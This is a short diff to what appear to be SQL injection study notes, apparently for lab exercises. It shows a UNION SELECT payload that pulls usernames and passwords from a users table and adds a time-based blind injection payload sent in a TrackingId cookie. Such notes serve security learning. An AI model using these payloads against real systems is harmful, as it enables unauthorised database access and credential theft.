@@ -89,7 +89,9 @@
 - __Extracting the data from the two columns (1.username_ygmrlj, 2.password_jiuphc) from table(USERS_RDINGX)__
   - __`'+UNION+SELECT+username_ygmrlj,+password_jiuphc+FROM+USERS_RDINGX--`__
 
+## Blind SQL injection with time delays
 
+- __`cookie: TrackingId=x'||pg_sleep(10);`__
 
 # SQLmap
 
